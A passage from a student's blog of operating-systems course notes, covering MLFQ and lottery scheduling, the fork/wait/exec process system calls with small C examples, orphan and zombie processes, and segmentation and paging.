<h4 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h4><ol>
<li><p>Priority Boost</p>
<ul>
<li><p>Rule 5: <font color="F54747">After some time period S, move all the jobs to the topmost queue (highest priority)</font></p>
</li>
<li><p>Example:</p>
<ul>
<li>A long-running job A with two short-running interactive job B and C</li>
<li>It will induce starvation of A, Rule 5 can avoid this situation.  <img src="https://p.ipic.vip/0mj9j8.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p>Prevent gaming of scheduler</p>
<ul>
<li><p>Improvement on rule 4:</p>
</li>
<li><p>Rule 4: <font color="F54747">Once a job uses up its time allotment at a given level</font> (regardless of how many times it has given up the CPU), <font color="F54747">its priority is reduced</font></p>
</li>
<li><p>Example:</p>
  <img src="https://p.ipic.vip/b1ghgu.png" width="500px"></li>
</ul>
</li>
<li><p>Tuning MLFQ</p>
<ul>
<li><font color="F54747">Lower Priority, Longer Quanta (time slice)</font></li>
<li>The high-priority queues → Short time slice</li>
<li>The low-priority queues → Longer time slice <img src="https://p.ipic.vip/jqklbl.png" width="350px"></li>
</ul>
</li>
</ol>
<h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><ul>
<li>The refined set of MLFQ Rules:<ol>
<li>If Priority(A) &gt; Priority(B), A runs</li>
<li>If Priority(A) &#x3D; Priority(B), A &amp; B run in Round Robin</li>
<li>When a job enters the system, it is placed at the highest priority</li>
<li>Once a job uses up its time allotment at a given level, its priority is reduced</li>
<li>After some time period S, move all the jobs in the system to the topmost queue</li>
</ol>
</li>
</ul>
<h3 id="Proportional-Share"><a href="#Proportional-Share" class="headerlink" title="Proportional Share"></a>Proportional Share</h3><ul>
<li>A fair-share scheduler<ul>
<li>Guarentee that each job obtain a certain percentage of CPU time</li>
<li>Not optimized for turnaround time or response time</li>
</ul>
</li>
</ul>
<h4 id="Lottery-Scheduling"><a href="#Lottery-Scheduling" class="headerlink" title="Lottery Scheduling"></a>Lottery Scheduling</h4><ol>
<li><p>Tickets</p>
<ul>
<li>Represent the share of a resource that a process should receive.</li>
<li>The percentage of tickets represents its share of the system resource.</li>
</ul>
</li>
<li><p>Scheduling</p>
<ul>
<li>The scheduler picks a winning ticket, then, load the state of winning process and runs it. <img src="https://p.ipic.vip/jsrfi9.png" width="500px"></li>
</ul>
</li>
<li><p>Ticket Mechanisms</p>
<ol>
<li><p>Ticket Currency</p>
<ul>
<li>A user can allocate tickets among their own jobs in a currency.</li>
<li>The system converts the currency into the correct global value.</li>
</ul>
</li>
<li><p>Ticket Transfer</p>
<ul>
<li>A process can <font color="3A75EA">temporarily hand off</font> its tickets to another process.</li>
</ul>
</li>
<li><p>Ticket Inflation</p>
<ul>
<li>A process can <font color="3A75EA">temporarily change</font> the umber of tickets it owns.</li>
<li>If any one process needs more CPU time, it can boost its tickets.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>System Call (Process)</title>
    <url>/myBlog/2022/09/17/2022/CSCI3150/2022-9-16-CSCI3150-SystemCall-Process/</url>
    <content><![CDATA[<h2 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h2><h3 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h3><ol>
<li><p>A process contains:</p>
<ul>
<li>A unique ID</li>
<li>A thread of control</li>
<li>Some private data</li>
</ul>
</li>
<li><p>Parent-Child Links:</p>
<ul>
<li>parent process: executes the request for creation of a process</li>
<li>child process: the created process</li>
<li>Noted: A child process inherits <font color="f54747">all the properties of its parent</font> when it is created.</li>
</ul>
</li>
</ol>
<h3 id="Process-ID"><a href="#Process-ID" class="headerlink" title="Process ID"></a>Process ID</h3><ol>
<li><p>Process ID (PID): </p>
<ul>
<li>Each process has a unique ID number.</li>
<li>It’s use to identify different processes.</li>
</ul>
</li>
<li><p>User ID (UID):</p>
<ul>
<li>Each user has a unique user ID.</li>
<li>Each process is associated with the the owner of the process, the owner has privileges with respect to the process.</li>
</ul>
</li>
<li><p>Obtain ID in C:</p>
<ol>
<li><p><code>getpid()</code> - obtain the child’s PID.</p>
</li>
<li><p><code>getppid()</code> - obtain the parent’s PID.</p>
</li>
<li><p><code>getuid()</code> - obtain the owner’s UID.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 1-getpid */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>   <span class="comment">// printf()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  <span class="comment">// getpid()</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My PID is %d, UID is %d, My Parent PID is %d\n&quot;</span>,</span><br><span class="line">        getpid(), getuid(), getppid());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    My PID is 4003, UID is 501, My Parent PID is 3843</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Obtain ID in terminal:</p>
<ol>
<li><code>ps</code> - lists the current processes.</li>
<li><code>ps -a</code> - lists more processes, including the processes that being run by other users and at other terminals.</li>
<li><code>ps -l</code> - prints more information lines, including UID, PID, PPID, process status, etc.</li>
</ol>
</li>
</ol>
<h2 id="Process-Operations"><a href="#Process-Operations" class="headerlink" title="Process Operations"></a>Process Operations</h2><h3 id="fork-System-Call"><a href="#fork-System-Call" class="headerlink" title="fork System Call"></a><code>fork</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To create a process (child process).</li>
</ul>
</li>
<li><p>Syntax: <code>int fork()</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>To child: return <font color="f54747">0</font></li>
<li>To parent: return <font color="f54747">child’s PID</font></li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/bmx0k0.png" width="500px"/>



<ul>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 2-fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret_from_fork;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: my pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    ret_from_fork = fork();     <span class="comment">// create a child</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: my pid is %d, return value from fork():%d\n&quot;</span>,</span><br><span class="line">                getpid(), ret_from_fork);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Before: my pid is 3991</span></span><br><span class="line"><span class="comment">    After: my pid is 3994, return value from fork():0</span></span><br><span class="line"><span class="comment">    After: my pid is 3991, return value from fork():3994</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>Task:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* How many child processes were created? */</span></span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 6-3fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID - %d, PPID -%d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    PID - 5207, PPID -5141</span></span><br><span class="line"><span class="comment">    PID - 5210, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5209, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5211, PPID -5209</span></span><br><span class="line"><span class="comment">    PID - 5208, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5213, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5212, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5214, PPID -5212</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="wait-System-Call"><a href="#wait-System-Call" class="headerlink" title="wait System Call"></a><code>wait</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>After <code>fork()</code> system call, both parent and child proceed <font color="f54747">independently</font>.</li>
<li>Therefore, if a parent wants to wait unitl the child finishes, then executes <code>wait()</code> or <code>waitpid()</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>pid_t wait(int *stat)</code></p>
<ul>
<li><code>stat</code>: the child process</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>If because a child terminated: return <font color="f54747">the PID of that child</font></li>
<li>Otherwise, return <font color="f54747">-1</font></li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li>it causes the caller process to pause,<ul>
<li><font color="7B3279">until the a child terminates or stops</font>, or</li>
<li><font color="7B3279">until the caller recieves a signal</font></li>
</ul>
</li>
<li>it returns right away,<ul>
<li>if <font color="7B3279">the process has no child</font>, or </li>
<li>if <font color="7B3279">the child has already terminated or stopped but has not yet been waited for</font></li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-mywait */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> waitreturn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// repeat 5 times</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="comment">// create a child then break -&gt; new process becomes parent</span></span><br><span class="line">        <span class="keyword">if</span>((childpid = fork()) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait the child precess terminates</span></span><br><span class="line">    <span class="keyword">if</span>((waitreturn = wait(&amp;status)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// if there is no child (wait returns -1 which &lt; 0)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wait(): Returns - %d.\n&quot;</span>, waitreturn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am process %d, my parent is %d, childpid:%d, i:%d\n&quot;</span>,</span><br><span class="line">        getpid(), getppid(), childpid, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    wait(): Returns - -1.</span></span><br><span class="line"><span class="comment">    I am process 4119, my parent is 4118, childpid:0, i:5</span></span><br><span class="line"><span class="comment">    I am process 4118, my parent is 4117, childpid:4119, i:4</span></span><br><span class="line"><span class="comment">    I am process 4117, my parent is 4116, childpid:4118, i:3</span></span><br><span class="line"><span class="comment">    I am process 4116, my parent is 4115, childpid:4117, i:2</span></span><br><span class="line"><span class="comment">    I am process 4115, my parent is 3843, childpid:4116, i:1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="exec-System-Call"><a href="#exec-System-Call" class="headerlink" title="exec System Call"></a><code>exec</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To change processes.</li>
<li>The <code>fork</code> system call creates a copy of the calling process (child inherits all the properties of its parent).</li>
<li>However, many applications require the child process to <font color="f54747">executes code different from the parent’s</font>.</li>
<li>Therefore, executes <code>exec</code> family system calls to overlay the calling process with a new executable module.</li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li><code>exec</code> will load a new executable into the process image, copies the arguments into the process and calls <code>main(args, argy)</code>.</li>
<li>If succeed, <font color="f54747"><code>exec</code> never returns</font>. The calling process is completely overlaid by the new program.</li>
<li>The <code>fork-exec</code> combination can <font color="f54747">let the child execute the new program</font> while the parent continues to execute the original code.</li>
</ul>
</li>
<li><p>Variations of <code>exec</code> system call:</p>
<ul>
<li><p><code>execl</code> calls (<code>execl</code>, <code>execlp</code>, <code>execle</code>)</p>
<ul>
<li>pass the command-line arguments as <font color="f54747">a list of pointers</font>.</li>
</ul>
</li>
<li><p><code>execv</code> calls (<code>execv</code>, <code>execvp</code>, <code>execve</code>)</p>
<ul>
<li>pass the command-line arguments in <font color="f54747">an argument array</font>, which is an array of pointers <font color="7B3279">to null-terminated</font> strings (ie. must be terminated by a NULL pointer).</li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 8-myexecl */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> *cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, wait(&amp;status));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a child to execute new program</span></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: fork()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child code (childpid for child is 0) */</span></span><br><span class="line">        <span class="keyword">if</span> (execvp(cmd, argv) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: execvp()\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(childpid != wait(&amp;status))&#123;   </span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: wait()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Results: print the list</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Process-Termination"><a href="#Process-Termination" class="headerlink" title="Process Termination"></a>Process Termination</h2><h3 id="Two-Terminations"><a href="#Two-Terminations" class="headerlink" title="Two Terminations"></a>Two Terminations</h3><ol>
<li><p><strong>Normal Process Termination</strong></p>
<ul>
<li>A process terminates normally when,<ol>
<li>a <code>return</code> from <code>main</code></li>
<li>an implicit return from main</li>
<li>a call to the <code>_exit</code> system call</li>
<li>a call to the C function <code>exit</code></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>Abnormal Process Termination</strong></p>
<ul>
<li>A process terminates abnormally when,<ol>
<li>calling <code>abort</code>, causing the SIGABRT signal to be sent to the calling process.</li>
<li>processing a signal that causes termination.</li>
</ol>
</li>
<li>User-installed exit handler will not be called upon abnormal termination.</li>
</ul>
</li>
</ol>
<h3 id="Orphan-Process"><a href="#Orphan-Process" class="headerlink" title="Orphan Process"></a>Orphan Process</h3><ul>
<li><p>it occurs if when the child still executing but its parent has terminated.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-orphan */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>  <span class="keyword">if</span>(childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">10</span>);      <span class="comment">// the child has not been terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">1</span>);       <span class="comment">// the parent is terminated</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Zombie-Process"><a href="#Zombie-Process" class="headerlink" title="Zombie Process"></a>Zombie Process</h3><ul>
<li><p>it occurs if the parent of the terminating process is not currently executing a <code>wait()</code>.</p>
</li>
<li><p>Noted: <font color="f54747">the zombie process is not an orphan process</font>.</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 9-1-zombie */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error in the fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>  <span class="keyword">if</span> (childpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*child code*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before: I am the child (PID - %d, PPID -%d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">/* parent code */</span></span><br><span class="line">        sleep(<span class="number">100</span>);     <span class="comment">// child process is terminated but parent does not</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent (PID - %d, PPID - %d)\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    ls -l</span></span><br><span class="line"><span class="comment">        UID   PID  PPID  S</span></span><br><span class="line"><span class="comment">        501  4276  4275  Z+      // this is the zombie process</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualizing Memory (Segmentation and Paging)</title>
    <url>/myBlog/2022/11/26/2022/CSCI3150/2022-11-26-CSCI3150-Virtualizing-Memory-Segmentation-Paging/</url>
    <content><![CDATA[<h2 id="Segmentation"><a href="#Segmentation" class="headerlink" title="Segmentation"></a>Segmentation</h2><ul>
<li>Segment is <font color="3A75EA">a contiguous portion</font> of the address space of a particular length.<ul>
<li>Different segments: code, stack, heap.</li>
<li>Each segment can be placed in <font color="3A75EA">different part of physical memory</font>.<ul>
<li>base and bounds exist in each segment  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isrvo2yzj31dr0u0dl6.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h3><p>$$ physical \thinspace address &#x3D; offset + base $$</p>
<ul>
<li><p>The code segment starts at the <font color="3A75EA">virtual address 0</font> in address space.</p>
</li>
<li><p>Example:</p>
<ol>
<li><p>Code Segment: the offset of virtual address 100 is 100.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isuq8elcj31qk0rwn4d.jpg" width="500px">
</li>
<li><p>Heap Segment: the offset of virtual address 4200 is 104.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8it14f3uzj31qk0ssdna.jpg" width="500px"></li>
</ol>
</li>
<li><p>Segmentation Fault</p>
<ul>
<li>If an illegal Address is referenced, the hardware detects that the address is <font color="3A75EA">out of bounds</font>.</li>
</ul>
</li>
</ul>
<h3 id="Referring-to-Segment"><a href="#Referring-to-Segment" class="headerlink" title="Referring to Segment"></a>Referring to Segment</h3><ul>
<li><p><strong>Explicit approach</strong></p>
<ul>
<li>chop up the address space into segments based on the <font color="3A75EA">top few bits</font> of virtual address.</li>
<li>Example: virtual address 4200 (<code>01000001101000</code>)  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itd4u9ulj31qk0b4ta8.jpg" width="400px">
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    SEG_MASK = 0x3000 (11000000000000)</span></span><br><span class="line"><span class="comment">    SEG_SHIFT = 12</span></span><br><span class="line"><span class="comment">    OFFSET_MASK = 0xFFF (00111111111111)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// get top 2 bits of 14-bit VA</span></span><br><span class="line">Segment = (VirtualAddress &amp; SEG_MASK) &gt;&gt; SEG_SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// now get offset</span></span><br><span class="line">Offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line"><span class="keyword">if</span> (Offset &gt;= Bounds[Segment])&#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    PhysAddr = Base[Segment] + Offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Stack Segment</strong></p>
<ul>
<li>Since stack grows backward, an <font color="3A75EA">extra hardware support</font>:<ul>
<li>The hardware checks which way the segment grows</li>
<li><code>1</code> - positive direction, <code>0</code> - negative direction  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itl1l7kcj31qk0n0792.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Sharing</strong></p>
<ul>
<li>Segment can be shared between address space by an <font color="3A75EA">extra hardware support</font>: <font color="F54747"><strong>Production bits</strong></font><ul>
<li>a few more bit to indicate permissions of <font color="3A75EA">read</font>, <font color="3A75EA">write</font> and <font color="3A75EA">execute</font> in each segment   <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itpg0fbrj31qk0cuq56.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Fragmentation"><a href="#Fragmentation" class="headerlink" title="Fragmentation"></a>Fragmentation</h3><ul>
<li><p><strong>External Fragmentation</strong>: some little holes of <font color="3A75EA">free space</font> in the physical memory that make difficulty to allocate new segments.</p>
</li>
<li><p><strong>Compaction</strong>: rearranging the exiting segments in physical memory, but it is costly.</p>
<ul>
<li>Stop the running process</li>
<li>Copy data to somewhere</li>
<li>Change segment register value  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itxjpxplj31gs0u0gro.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Segmentation uses the base-bounds pair to represent the location and boundary of process in the physical memory<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw3wu4gwj310n0u0afr.jpg" width="500px"></li>
</ul>
<h2 id="Paging"><a href="#Paging" class="headerlink" title="Paging"></a>Paging</h2><ul>
<li><p>Paging <font color="3A75EA">splits up</font> the address space into <font color="F54747">fixed-sized</font> unit called a <font color="F54747">page</font>.</p>
</li>
<li><p>With paging, physical memory is also split into some number of pages called a <font color="F54747">page frame</font>.</p>
</li>
<li><p><font color="3A75EA">Page table</font> per process is needed to <font color="3A75EA">translate</font> the virtual address to physical address.</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iu4scb3fj31j20u0te2.jpg" width="500px">
</li>
<li><p><strong>Advantages</strong></p>
<ol>
<li><p><font color="3A75EA">Flexibility</font>: </p>
<ul>
<li>Do not need to assume how heap and stack grow and be used.</li>
</ul>
</li>
<li><p><font color="3A75EA">Simplicity</font>: </p>
<ul>
<li>The page in address space and the page frame are same size (usually 4KB).</li>
